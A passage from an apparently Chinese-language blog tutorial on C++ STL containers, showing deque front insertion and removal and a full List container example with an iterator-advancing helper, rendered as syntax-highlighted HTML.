string\">\"\\n=============erase删除=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t<span class=\"token comment\">// 迭代器遍历</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>\tdeque<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator nIt <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nIt <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>nIt<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t<span class=\"token comment\">// 删除多个元素，删除指定区间的元素</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============erase删除2=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> v1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面介绍一下 deque 的两个独有的函数  <code>push_front</code>  和  <code>pop_front</code></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    语法格式：void push_front (const T&amp; x);</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    函数意义：将元素插入到首部</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>v1<span class=\"token punctuation\">.</span><span class=\"token function\">push_front</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    语法格式：void pop_front ();</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    函数意义：删除首部的元素</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>v1<span class=\"token punctuation\">.</span><span class=\"token function\">pop_front</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h2 id=\"list容器\"><a class=\"anchor\" href=\"#list容器\">#</a> List 容器</h2>\n<h3 id=\"什么是list容器\"><a class=\"anchor\" href=\"#什么是list容器\">#</a> 什么是 List 容器</h3>\n<ol>\n<li>\n<p>List 容器是一个双向链表；</p>\n</li>\n<li>\n<p>不支持随机存取，不支持 at.[pos] 函数和 [] 操作符；</p>\n</li>\n<li>\n<p>List 容器除了具有所有顺序容器都有的函数以外，还支持以下函数：</p>\n</li>\n</ol>\n<p><code>push_front</code>  ：将元素插入到首部<br />\n <code>pop_front</code>  ：删除首部的元素<br />\n <code>sort</code>  ：排序 (list 单独实现)<br />\n <code>remove</code>  ：删除与指定值相等的元素<br />\n <code>unique</code>  ：删除所有和前一个元素相同的元素<br />\n <code>merge</code>  ：合并两个链表，并清空被合并的那个 (list 单独实现)，需要注意的是两个容器必须都是有序的，要么都是升序，要么都是降序，如果不一样会报错，合并后生成的表仍是有序的。<br />\n <code>reverse</code>  ：颠倒链表</p>\n<h3 id=\"使用list容器\"><a class=\"anchor\" href=\"#使用list容器\">#</a> 使用 List 容器</h3>\n<p>List 容器具有所有顺序容器都有的函数，这里也不赘述那些函数了，但是有一个地方需要注意，就是 List 容器也没办法使用类似 <code>v1.begin()+3</code>  这种用法，如果你要使用的时候建议单独写一个函数：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>list<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator <span class=\"token function\">MoveIterator</span><span class=\"token punctuation\">(</span>list<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator<span class=\"token operator\">*</span> pIt<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> nLen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> nLen<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>pIt<span class=\"token punctuation\">)</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token operator\">*</span>pIt<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>下面是全部代码：</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// STL-03List.cpp : 此文件包含 \"main\" 函数。程序执行将在此处开始并结束。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;list></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>list<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator <span class=\"token function\">MoveIterator</span><span class=\"token punctuation\">(</span>list<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator<span class=\"token operator\">*</span> pIt<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> nLen<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> nLen<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>pIt<span class=\"token punctuation\">)</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token operator\">*</span>pIt<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token comment\">// 构造容器</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tlist<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> v1<span class=\"token punctuation\">;</span>\t\t\t\t<span class=\"token comment\">// 空的容器，里面没有元素</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\tlist<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v2</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 100 个容器，默认数据都为 0</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\tlist<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v3</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t<span class=\"token comment\">// 100 个值为 8 的元素</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\tlist<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v4</span><span class=\"token punctuation\">(</span>v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t\t\t<span class=\"token comment\">// 100 个值为 8 的元素</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token keyword\">int</span> nTmpAry<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span><span class=\"token number\">21</span><span class=\"token punctuation\">,</span><span class=\"token number\">22</span><span class=\"token punctuation\">,</span><span class=\"token number\">23</span><span class=\"token punctuation\">,</span><span class=\"token number\">24</span><span class=\"token punctuation\">,</span><span class=\"token number\">25</span><span class=\"token punctuation\">,</span><span class=\"token number\">26</span><span class=\"token punctuation\">,</span><span class=\"token number\">27</span><span class=\"token punctuation\">,</span><span class=\"token number\">28</span><span class=\"token punctuation\">,</span><span class=\"token number\">29</span><span class=\"token punctuation\">,</span><span class=\"token number\">30</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tlist<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">v5</span><span class=\"token punctuation\">(</span>nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 从 nTmpAry 数组中索引为 1 开始，到数组索引为 5，复制这个区间内数组的元素到容器中</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t<span class=\"token comment\">// 添加元素</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\t<span class=\"token comment\">// 每次都添加到了容器的尾部</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\tlist<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator v1b <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token comment\">// 添加到指定位置</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token comment\">// 在容器首部添加一个值为 99 的元素</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>\t<span class=\"token comment\">// 在容器第 3 个位置处插入 2 个 98</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span><span class=\"token function\">MoveIterator</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v1b<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>\t<span class=\"token comment\">// 在容器首部添加数组 nTmpAry 索引为 6 到 9 区间内的元素到容器中</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> nTmpAry <span class=\"token operator\">+</span> <span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token comment\">// 在容器首部添加元素</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">push_front</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token comment\">// 打印</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"====================v1的地址为：%p\\r\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>\t<span class=\"token comment\">// 迭代器遍历</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>\tlist<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span><span class=\"token operator\">::</span>iterator nIt <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nIt <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>nIt<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>\t<span class=\"token comment\">// 删除元素</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token comment\">// 删除首部元素</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">pop_front</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============pop_front删除=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>\t<span class=\"token comment\">// 迭代器遍历</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>\tnIt <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nIt <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>nIt<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>\t<span class=\"token comment\">// 删除尾部元素</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">pop_back</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============pop_back删除=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>\t<span class=\"token comment\">// 迭代器遍历</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>\tnIt <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nIt <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>nIt<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>\t<span class=\"token comment\">// 删除指定位置的元素</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>\tv1b <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span><span class=\"token function\">MoveIterator</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v1b<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============erase删除=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>\t<span class=\"token comment\">// 迭代器遍历</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>\tnIt <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nIt <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>nIt<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>\t<span class=\"token comment\">// 删除多个元素，删除指定区间的元素</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>\tv1b <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>\tv1<span class=\"token punctuation\">.</span><span class=\"token function\">erase</span><span class=\"token punctuation\">(</span>v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">MoveIterator</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>v1b<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\n=============erase删除2=======\\r\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>\t<span class=\"token comment\">// 迭代器遍历</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\tnIt <span class=\"token operator\">=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">begin</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>nIt <span class=\"token operator\">!=</span> v1<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\\t\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>nIt<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\t<span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\t\tpush_front ：将元素插入到首部</pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\t\tpop_front ：删除首部的元素</pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t\tsort ：排序 (list 单独实现)</pre></td></tr><tr><td 